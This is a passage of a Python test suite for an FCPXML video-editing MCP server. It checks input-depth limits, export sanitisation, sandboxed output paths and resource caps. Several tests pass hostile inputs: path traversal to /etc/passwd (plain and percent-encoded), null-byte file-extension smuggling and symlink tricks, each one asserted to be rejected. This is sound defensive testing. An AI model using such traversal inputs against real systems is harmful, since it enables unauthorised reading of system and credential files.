        result = write_fcpxml(root, out, strict=False)
        assert result == out


# ============================================================================
# JSON DEPTH LIMIT (v0.6.18)
# ============================================================================

class TestJsonDepthLimit:
    """Verify _check_json_depth rejects adversarial nesting."""

    def test_shallow_json_passes(self):
        """Normal beat data (depth ~2) passes validation."""
        sys.path.insert(0, ".")
        from server import _check_json_depth
        data = {"beats": [0.5, 1.0, 1.5, 2.0]}
        _check_json_depth(data)  # Should not raise

    def test_flat_list_passes(self):
        """Simple list of beat times passes."""
        from server import _check_json_depth
        _check_json_depth([0.5, 1.0, 1.5, 2.0])

    def test_deeply_nested_dict_rejected(self):
        """Dict nested 60 levels deep is rejected (limit=50)."""
        from server import _check_json_depth
        nested: dict = {}
        current = nested
        for _ in range(60):
            current["a"] = {}
            current = current["a"]
        with pytest.raises(ValueError, match="nesting depth exceeds"):
            _check_json_depth(nested)

    def test_deeply_nested_list_rejected(self):
        """List nested 60 levels deep is rejected."""
        from server import _check_json_depth
        nested: list = []
        current = nested
        for _ in range(60):
            inner: list = []
            current.append(inner)
            current = inner
        with pytest.raises(ValueError, match="nesting depth exceeds"):
            _check_json_depth(nested)

    def test_depth_exactly_at_limit_passes(self):
        """Object nested exactly at the limit (50) passes."""
        from server import _check_json_depth
        nested: dict = {}
        current = nested
        for _ in range(49):
            current["a"] = {}
            current = current["a"]
        _check_json_depth(nested)  # Should not raise

    def test_scalar_values_pass(self):
        """Scalars (str, int, float, None, bool) pass without issue."""
        from server import _check_json_depth
        for val in ["hello", 42, 3.14, None, True]:
            _check_json_depth(val)


# ============================================================================
# XMEML EXPORT SANITIZATION (v0.6.49)
# ============================================================================

class TestExportSanitization:
    """Verify export.py sanitizes user-controlled strings in XMEML output.

    The XMEML exporter writes timeline names, clip names, and media paths
    into XML text nodes.  Prior to v0.6.49 these were written raw — control
    characters and null bytes in a malicious FCPXML would pass through to
    the exported XMEML, potentially crashing downstream NLE parsers.
    """

    def test_xmeml_clipitem_name_sanitized(self, tmp_path):
        """Control chars in clip names are stripped by _add_xmeml_clipitem."""
        track = ET.Element('track')
        clip_data = {
            'name': "Evil\x00Clip\x01Name\x02",
            'duration_seconds': 10.0,
            'start_seconds': 0.0,
            'source_start_seconds': 0.0,
            'media_path': "/path/to\x00/bad\x03.mov",
            'has_audio': True,
        }
        # Call the clipitem builder directly — no file needed
        DaVinciExporter._add_xmeml_clipitem(None, track, clip_data, 24.0)

        clipitem = track.find('clipitem')
        name_text = clipitem.find('name').text
        assert "\x00" not in name_text
        assert "\x01" not in name_text
        assert "\x02" not in name_text
        assert name_text == "EvilClipName"

    def test_xmeml_media_path_sanitized(self, tmp_path):
        """Control chars in media paths stripped from pathurl output."""
        track = ET.Element('track')
        clip_data = {
            'name': "CleanName",
            'duration_seconds': 5.0,
            'start_seconds': 0.0,
            'source_start_seconds': 0.0,
            'media_path': "/videos/clip\x00inject\x03.mov",
            'has_audio': True,
        }
        DaVinciExporter._add_xmeml_clipitem(None, track, clip_data, 24.0)

        pathurl = track.find('.//pathurl')
        assert "\x00" not in pathurl.text
        assert "\x03" not in pathurl.text
        assert pathurl.text == "/videos/clipinject.mov"

    def test_xmeml_sequence_name_sanitized(self, tmp_path):
        """Timeline name sanitized during XMEML export."""
        xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fcpxml>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
        <asset id="r2" name="Clip" src="test.mov" start="0s" duration="240/24s"/>
    </resources>
    <library>
        <event name="Test">
            <project name="CleanProject">
                <sequence format="r1" duration="240/24s">
                    <spine>
                        <asset-clip ref="r2" offset="0s" name="Clip"
                                    start="0s" duration="240/24s" format="r1"/>
                    </spine>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        src = tmp_path / "clean.fcpxml"
        src.write_text(xml)
        out = str(tmp_path / "out.xml")
        exporter = DaVinciExporter(str(src))
        # Inject control chars into the parsed timeline name post-parse
        exporter.project.primary_timeline.name = "Bad\x00Name\x01Here"
        exporter.export_xmeml(out)
        with open(out) as f:
            content = f.read()
        assert "\x00" not in content
        assert "\x01" not in content
        assert "BadNameHere" in content


# ============================================================================
# OUTPUT PATH SANDBOX ENFORCEMENT (v0.6.58)
# ============================================================================

class TestOutputPathSandbox:
    """Verify _resolve_io_paths anchors writes to the input file's directory."""

    def test_output_anchored_to_source_dir(self, tmp_path):
        """Default output stays in the same directory as the input file."""
        sys.path.insert(0, ".")
        from server import _resolve_io_paths

        src = tmp_path / "project.fcpxml"
        src.write_text('<?xml version="1.0"?><fcpxml version="1.11"/>')
        _, out = _resolve_io_paths({"filepath": str(src)})
        assert str(tmp_path) in out

    def test_output_escape_blocked(self, tmp_path):
        """Explicit output_path outside source dir is rejected."""
        from server import _resolve_io_paths

        src = tmp_path / "project.fcpxml"
        src.write_text('<?xml version="1.0"?><fcpxml version="1.11"/>')
        with pytest.raises(ValueError, match="escapes allowed directory"):
            _resolve_io_paths({
                "filepath": str(src),
                "output_path": "/tmp/evil_output.fcpxml",
            })


# ============================================================================
# SPEED PARAMETER VALIDATION (v0.6.58)
# ============================================================================

class TestSpeedValidation:
    """Verify handle_change_speed rejects zero, negative, and extreme speeds."""

    @pytest.mark.asyncio
    async def test_zero_speed_rejected(self):
        """speed=0 causes division by zero — must be caught before math."""
        sys.path.insert(0, ".")
        from server import handle_change_speed

        with pytest.raises(ValueError, match="positive number"):
            await handle_change_speed({
                "filepath": "/nonexistent.fcpxml",
                "clip_id": "c1",
                "speed": 0,
            })

    @pytest.mark.asyncio
    async def test_negative_speed_rejected(self):
        from server import handle_change_speed

        with pytest.raises(ValueError, match="positive number"):
            await handle_change_speed({
                "filepath": "/nonexistent.fcpxml",
                "clip_id": "c1",
                "speed": -2.0,
            })

    @pytest.mark.asyncio
    async def test_extreme_speed_rejected(self):
        from server import handle_change_speed

        with pytest.raises(ValueError, match="positive number"):
            await handle_change_speed({
                "filepath": "/nonexistent.fcpxml",
                "clip_id": "c1",
                "speed": 999,
            })


# ============================================================================
# FFMPEG PARAMETER VALIDATION (v0.6.58)
# ============================================================================

class TestEnsureVideoAssetValidation:
    """Verify _ensure_video_asset rejects out-of-range numeric parameters."""

    def test_negative_duration_rejected(self):
        from fcpxml.writer import _ensure_video_asset

        with pytest.raises(ValueError, match="duration"):
            _ensure_video_asset("/fake.png", duration=-5)

    def test_zero_fps_rejected(self):
        from fcpxml.writer import _ensure_video_asset

        with pytest.raises(ValueError, match="fps"):
            _ensure_video_asset("/fake.png", fps=0)

    def test_odd_width_rejected(self):
        from fcpxml.writer import _ensure_video_asset

        with pytest.raises(ValueError, match="width"):
            _ensure_video_asset("/fake.png", width=1921)

    def test_huge_height_rejected(self):
        from fcpxml.writer import _ensure_video_asset

        with pytest.raises(ValueError, match="height"):
            _ensure_video_asset("/fake.png", height=9999)


# ============================================================================
# MCP RESOURCE URI HANDLING (v0.14.0)
#
# `preview://` is the one new attack-reachable entry point this release adds.
# Everything below drives the real `read_resource` coroutine — the same
# function the MCP client reaches — rather than poking `_validate_filepath`
# directly, so the URI-decoding step is inside the blast radius of the test.
# ============================================================================

class TestResourceUriParsing:
    """Backs the "URI parsing" row of the README security matrix."""

    def test_scheme_is_stripped_only_from_the_front(self):
        """A global .replace() mangles any path containing the scheme string."""
        assert (
            server_module._uri_to_path("preview:///tmp/preview:///a.fcpxml", "preview://")
            == "/tmp/preview:///a.fcpxml"
        )

    def test_percent_encoded_space_is_decoded(self):
        assert (
            server_module._uri_to_path("file:///tmp/My%20Project.fcpxml", "file://")
            == "/tmp/My Project.fcpxml"
        )

    def test_non_matching_scheme_leaves_the_value_untouched(self):
        """No scheme confusion: the file:// branch never eats a preview:// prefix."""
        assert (
            server_module._uri_to_path("preview:///tmp/a.fcpxml", "file://")
            == "preview:///tmp/a.fcpxml"
        )

    def test_percent_encoded_traversal_is_decoded_before_validation(self):
        """Decoding must happen BEFORE the path is validated, never after."""
        assert (
            server_module._uri_to_path("preview://%2e%2e/%2e%2e/etc/passwd", "preview://")
            == "../../etc/passwd"
        )


class TestPreviewResourceSecurity:
    """`preview://` must reject everything `file://` rejects."""

    @staticmethod
    def _read(uri):
        return asyncio.run(server_module.read_resource(uri))

    def _assert_rejected(self, uri):
        result = self._read(uri)
        assert isinstance(result, str), f"{uri} was served instead of rejected"
        assert "<!DOCTYPE html>" not in result, f"{uri} leaked rendered content"
        return result

    def test_relative_traversal_to_etc_passwd_rejected(self):
        self._assert_rejected("preview://../../../../etc/passwd")

    def test_absolute_path_outside_the_project_rejected(self):
        self._assert_rejected("preview:///etc/passwd")

    def test_percent_encoded_traversal_rejected(self):
        """Traversal hidden behind percent-encoding must not survive unquoting."""
        self._assert_rejected("preview://%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")

    def test_non_fcpxml_extension_rejected(self):
        result = self._assert_rejected("preview://server.py")
        assert "Invalid file type" in result

    def test_null_byte_rejected(self):
        result = self._assert_rejected("preview://examples/sample.fcpxml\x00.py")
        assert "null byte" in result

    def test_percent_encoded_null_byte_rejected(self):
        """unquote() can reintroduce a null byte — validation must run after it."""
        result = self._assert_rejected("preview://examples/sample.fcpxml%00.py")
        assert "null byte" in result

    def test_symlink_to_disallowed_target_rejected(self, tmp_path):
        """Extensions are checked on the RESOLVED path, so a .fcpxml symlink
        pointing at something else cannot smuggle it through."""
        target = tmp_path / "secrets.txt"
        target.write_text("SECRET")
        link = tmp_path / "innocent.fcpxml"
        link.symlink_to(target)
        result = self._assert_rejected(f"preview://{link}")
        assert "Invalid file type" in result

    def test_file_scheme_shares_the_same_rejections(self):
        """The pre-existing file:// branch must not regress either."""
        for uri in (
            "file://../../../../etc/passwd",
            "file:///etc/passwd",
            "file://server.py",
            "file://examples/sample.fcpxml\x00.py",
        ):
            result = self._read(uri)
            assert isinstance(result, str)
            assert "FCPXML Project" not in result, f"{uri} was served"


# ============================================================================
# SANDBOX ROOT ALLOWLIST (issue #10) — FCP_PROJECTS_DIRS multi-root confinement
# ============================================================================

class TestParseAllowedRoots:
    """FCP_PROJECTS_DIRS parses like PATH; FCP_PROJECTS_DIR still works."""

    def test_unset_means_no_confinement(self):
        assert server_module._parse_allowed_roots({}) == []

    def test_empty_string_means_no_confinement(self):
        assert server_module._parse_allowed_roots(
            {"FCP_PROJECTS_DIRS": "", "FCP_PROJECTS_DIR": "  "}
        ) == []

    def test_single_legacy_var_still_works(self, tmp_path):
        roots = server_module._parse_allowed_roots({"FCP_PROJECTS_DIR": str(tmp_path)})
        assert roots == [str(tmp_path.resolve())]

    def test_multi_root_split_on_pathsep(self, tmp_path):
        a = tmp_path / "a"
        b = tmp_path / "b"
        a.mkdir()
        b.mkdir()
        roots = server_module._parse_allowed_roots(
            {"FCP_PROJECTS_DIRS": f"{a}{os.pathsep}{b}"}
        )
        assert roots == [str(a.resolve()), str(b.resolve())]

    def test_both_vars_union_and_dedupe(self, tmp_path):
        a = tmp_path / "a"
        b = tmp_path / "b"
        a.mkdir()
        b.mkdir()
        roots = server_module._parse_allowed_roots(
            {"FCP_PROJECTS_DIRS": f"{a}{os.pathsep}{b}", "FCP_PROJECTS_DIR": str(a)}
        )
        assert roots == [str(a.resolve()), str(b.resolve())]

    def test_blank_segments_skipped(self, tmp_path):
        roots = server_module._parse_allowed_roots(
            {"FCP_PROJECTS_DIRS": f"{os.pathsep}{tmp_path}{os.pathsep}{os.pathsep}"}
        )
        assert roots == [str(tmp_path.resolve())]

    def test_tilde_expanded(self):
        roots = server_module._parse_allowed_roots({"FCP_PROJECTS_DIR": "~"})
        assert roots == [str(Path(os.path.expanduser("~")).resolve())]


class TestValidateFilepathRootConfinement:
    """_validate_filepath confines READS, not just listing — when roots are set."""

    @staticmethod
    def _make(tmp_path, name="proj.fcpxml"):
        f = tmp_path / name
        f.write_text("<fcpxml/>")
        return f

    def test_unset_roots_leave_behaviour_unchanged(self, tmp_path, monkeypatch):
        """Opt-in: with no roots configured, any .fcpxml on disk still reads."""
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [])
        f = self._make(tmp_path)
        assert _validate_filepath(str(f), ('.fcpxml',)) == str(f.resolve())

    def test_inside_root_allowed(self, tmp_path, monkeypatch):
        root = tmp_path / "lib"
        root.mkdir()
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [str(root)])
        f = self._make(root)
        assert _validate_filepath(str(f), ('.fcpxml',)) == str(f.resolve())

    def test_outside_root_rejected(self, tmp_path, monkeypatch):
        root = tmp_path / "lib"
        root.mkdir()
        outside = tmp_path / "elsewhere"
        outside.mkdir()
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [str(root)])
        f = self._make(outside)
        with pytest.raises(ValueError, match="escapes the allowed roots"):
            _validate_filepath(str(f), ('.fcpxml',))

    def test_second_root_allowed(self, tmp_path, monkeypatch):
        """The whole point of the multi-root list: an external drive still works."""
        a = tmp_path / "internal"
        b = tmp_path / "external"
        a.mkdir()
        b.mkdir()
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [str(a), str(b)])
        f = self._make(b)
        assert _validate_filepath(str(f), ('.fcpxml',)) == str(f.resolve())

    def test_symlink_inside_root_pointing_outside_rejected(self, tmp_path, monkeypatch):
        """The check runs on the RESOLVED path, so a symlink cannot smuggle."""
        root = tmp_path / "lib"
        root.mkdir()
        outside = tmp_path / "elsewhere"
        outside.mkdir()
        target = self._make(outside, "secret.fcpxml")
        link = root / "innocent.fcpxml"
        link.symlink_to(target)
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [str(root)])
        with pytest.raises(ValueError, match="escapes the allowed roots"):
            _validate_filepath(str(link), ('.fcpxml',))

    def test_traversal_out_of_root_rejected(self, tmp_path, monkeypatch):
        root = tmp_path / "lib"
        root.mkdir()
        outside = self._make(tmp_path, "outside.fcpxml")
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [str(root)])
        with pytest.raises(ValueError, match="escapes the allowed roots"):
            _validate_filepath(str(root / ".." / outside.name), ('.fcpxml',))

    def test_sibling_prefix_is_not_inside_root(self, tmp_path, monkeypatch):
        """`/libs-evil` must not count as inside `/lib` — prefix != ancestor."""
        root = tmp_path / "lib"
        root.mkdir()
        sneaky = tmp_path / "lib-evil"
        sneaky.mkdir()
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [str(root)])
        f = self._make(sneaky)
        with pytest.raises(ValueError, match="escapes the allowed roots"):
            _validate_filepath(str(f), ('.fcpxml',))


class TestListProjectsMultiRoot:
    """handle_list_projects honours every configured root, and only those."""

    def _run(self, directory):
        return asyncio.run(
            server_module.handle_list_projects({"directory": directory})
        )[0].text

    def test_directory_in_second_root_listed(self, tmp_path, monkeypatch):
        a = tmp_path / "internal"
        b = tmp_path / "external"
        a.mkdir()
        b.mkdir()
        (b / "p.fcpxml").write_text("<fcpxml/>")
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [str(a), str(b)])
        monkeypatch.setattr(server_module, "_SANDBOX_ENABLED", True)
        assert "p.fcpxml" in self._run(str(b))

    def test_directory_outside_all_roots_rejected(self, tmp_path, monkeypatch):
        a = tmp_path / "internal"
        a.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [str(a)])
        monkeypatch.setattr(server_module, "_SANDBOX_ENABLED", True)
        with pytest.raises(ValueError, match="escapes allowed root"):
            self._run(str(outside))

    def test_unset_roots_leave_listing_unconfined(self, tmp_path, monkeypatch):
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [])
        monkeypatch.setattr(server_module, "_SANDBOX_ENABLED", False)
        (tmp_path / "p.fcpxml").write_text("<fcpxml/>")
        assert "p.fcpxml" in self._run(str(tmp_path))


# ============================================================================
# RESOURCE CAPS (issue #11) — discovery walk, marker batch, inline transcript
# ============================================================================

class TestDiscoveryFileCap:
    """find_fcpxml_files stops the WALK at the cap and reports truncation."""

    @staticmethod
    def _tree(tmp_path, count):
        for i in range(count):
            d = tmp_path / f"d{i}"
            d.mkdir()
            (d / f"p{i}.fcpxml").write_text("<fcpxml/>")
        return tmp_path

    def test_under_cap_not_truncated(self, tmp_path):
        self._tree(tmp_path, 3)
        files, truncated = server_module.find_fcpxml_files_capped(str(tmp_path), cap=10)
        assert len(files) == 3
        assert truncated is False

    def test_over_cap_truncates_and_reports(self, tmp_path):
        self._tree(tmp_path, 12)
        files, truncated = server_module.find_fcpxml_files_capped(str(tmp_path), cap=5)
        assert len(files) == 5
        assert truncated is True

    def test_walk_stops_it_does_not_collect_then_slice(self, tmp_path, monkeypatch):
        """The whole point: a cap that slices afterwards still walks all of `/`.

        Counts what rglob actually yields — a collect-then-slice implementation
        would consume every entry.
        """
        self._tree(tmp_path, 50)
        real_rglob = Path.rglob
        yielded = []

        def counting_rglob(self, pattern, *a, **kw):
            for item in real_rglob(self, pattern, *a, **kw):
                yielded.append(item)
                yield item

        monkeypatch.setattr(Path, "rglob", counting_rglob)
        files, truncated = server_module.find_fcpxml_files_capped(str(tmp_path), cap=5)
        assert truncated is True
        assert len(files) == 5
        assert len(yielded) <= 6, f"walk consumed {len(yielded)} entries for a cap of 5"

    def test_default_cap_comes_from_module_constant(self, tmp_path, monkeypatch):
        self._tree(tmp_path, 8)
        monkeypatch.setattr(server_module, "MAX_DISCOVERY_FILES", 4)
        files, truncated = server_module.find_fcpxml_files_capped(str(tmp_path))
        assert len(files) == 4
        assert truncated is True

    def test_list_projects_says_the_list_is_incomplete(self, tmp_path, monkeypatch):
        """A partial list presented as complete is the failure mode."""
        self._tree(tmp_path, 8)
        monkeypatch.setattr(server_module, "MAX_DISCOVERY_FILES", 4)
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [])
        monkeypatch.setattr(server_module, "_SANDBOX_ENABLED", False)
        text = asyncio.run(
            server_module.handle_list_projects({"directory": str(tmp_path)})
        )[0].text
        assert "TRUNCATED" in text
        assert "incomplete" in text

    def test_list_projects_silent_when_under_cap(self, tmp_path, monkeypatch):
        self._tree(tmp_path, 2)
        monkeypatch.setattr(server_module, "MAX_DISCOVERY_FILES", 100)
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [])
        monkeypatch.setattr(server_module, "_SANDBOX_ENABLED", False)
        text = asyncio.run(
            server_module.handle_list_projects({"directory": str(tmp_path)})
        )[0].text
        assert "TRUNCATED" not in text


class TestMarkerBatchCap:
    """Marker batches are bounded, and the drop is reported, never silent."""

    def test_under_cap_untouched(self, monkeypatch):
        monkeypatch.setattr(server_module, "MAX_BATCH_MARKERS", 10)
        kept, dropped = server_module._cap_markers([{"n": i} for i in range(4)])
        assert len(kept) == 4
        assert dropped == 0

    def test_over_cap_trims_and_counts(self, monkeypatch):
        monkeypatch.setattr(server_module, "MAX_BATCH_MARKERS", 10)
        kept, dropped = server_module._cap_markers([{"n": i} for i in range(25)])
        assert len(kept) == 10
        assert dropped == 15

    def test_notice_is_empty_when_nothing_dropped(self):
        assert server_module._marker_cap_notice(0) == ""

    def test_notice_names_the_dropped_count(self, monkeypatch):
        monkeypatch.setattr(server_module, "MAX_BATCH_MARKERS", 10)
        notice = server_module._marker_cap_notice(15)
        assert "TRUNCATED" in notice
        assert "15" in notice

    def test_batch_handler_writes_only_the_cap_and_says_so(self, tmp_path, monkeypatch):
        import shutil
        src = Path(__file__).parent.parent / "examples" / "sample.fcpxml"
        target = tmp_path / "sample.fcpxml"
        shutil.copy(src, target)
        monkeypatch.setattr(server_module, "MAX_BATCH_MARKERS", 3)
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [])
        markers = [
            {"timecode": f"{i * 0.5}s", "name": f"M{i}", "marker_type": "standard"}
            for i in range(9)
        ]
        text = asyncio.run(server_module.handle_batch_add_markers({
            "filepath": str(target),
            "markers": markers,
        }))[0].text
        assert "Added 3 markers" in text
        assert "TRUNCATED" in text
        assert "6 marker(s) were NOT written" in text


class TestInlineTranscriptCap:
    """Inline transcript text is length-bounded, cut on a line boundary."""

    def test_under_cap_untouched(self, monkeypatch):
        monkeypatch.setattr(server_module, "MAX_INLINE_TRANSCRIPT_CHARS", 100)
        kept, dropped = server_module._cap_transcript_text("0:00 Intro\n")
        assert kept == "0:00 Intro\n"
        assert dropped == 0

    def test_over_cap_trims_and_counts(self, monkeypatch):
        monkeypatch.setattr(server_module, "MAX_INLINE_TRANSCRIPT_CHARS", 20)
        text = "\n".join(f"{i}:00 Line {i}" for i in range(20))
        kept, dropped = server_module._cap_transcript_text(text)
        assert len(kept) <= 20
        assert dropped == len(text) - len(kept)
        assert dropped > 0

    def test_cut_lands_on_a_line_boundary(self, monkeypatch):
        """A timestamp line must never be split in half and reinterpreted."""
        monkeypatch.setattr(server_module, "MAX_INLINE_TRANSCRIPT_CHARS", 15)
        kept, _ = server_module._cap_transcript_text("0:00 Alpha\n0:30 Bravo\n1:00 Chuck")
        assert kept == "0:00 Alpha"

    def test_notice_empty_when_nothing_dropped(self):
        assert server_module._transcript_cap_notice(0) == ""

    def test_transcript_handler_reports_truncation(self, tmp_path, monkeypatch):
        import shutil
        src = Path(__file__).parent.parent / "examples" / "sample.fcpxml"
        target = tmp_path / "sample.fcpxml"
        shutil.copy(src, target)
        monkeypatch.setattr(server_module, "MAX_INLINE_TRANSCRIPT_CHARS", 24)
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [])
        transcript = "0:00 Alpha\n0:01 Bravo\n0:02 Chuck\n0:03 Delta\n"
        text = asyncio.run(server_module.handle_import_transcript_markers({
            "filepath": str(target),
            "transcript": transcript,
        }))[0].text
        assert "TRUNCATED" in text
        assert "character(s) of transcript text were NOT read" in text
        assert "Delta" not in text


class TestRootConfinementCaseInsensitiveFilesystem:
    """macOS is case-insensitive but Path.resolve() does not normalise case.

    A root written `/users/me/Movies` must still match a file resolved as
    `/Users/me/Movies` — otherwise turning the sandbox on locks the user out
    of their own library. Skipped where the filesystem is case-sensitive, in
    which case the two directories really are different and must NOT match.
    """

    @staticmethod
    def _case_insensitive(tmp_path):
        probe = tmp_path / "CaseProbe"
        probe.mkdir()
        return (tmp_path / "caseprobe").exists()

    def test_differently_cased_root_still_matches(self, tmp_path, monkeypatch):
        if not self._case_insensitive(tmp_path):
            pytest.skip("filesystem is case-sensitive")
        root = tmp_path / "Movies"
        root.mkdir()
        f = root / "p.fcpxml"
        f.write_text("<fcpxml/>")
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [str(tmp_path / "movies")])
        assert _validate_filepath(str(f), ('.fcpxml',)) == str(f.resolve())

    def test_genuinely_outside_still_rejected_via_the_fallback(self, tmp_path, monkeypatch):
        """The stat fallback must not turn into 'allow everything'."""
        root = tmp_path / "Movies"
        root.mkdir()
        outside = tmp_path / "Elsewhere"
        outside.mkdir()
        f = outside / "p.fcpxml"
        f.write_text("<fcpxml/>")
        monkeypatch.setattr(server_module, "ALLOWED_ROOTS", [str(tmp_path / "movies")])
        with pytest.raises(ValueError, match="escapes the allowed roots"):
            _validate_filepath(str(f), ('.fcpxml',))
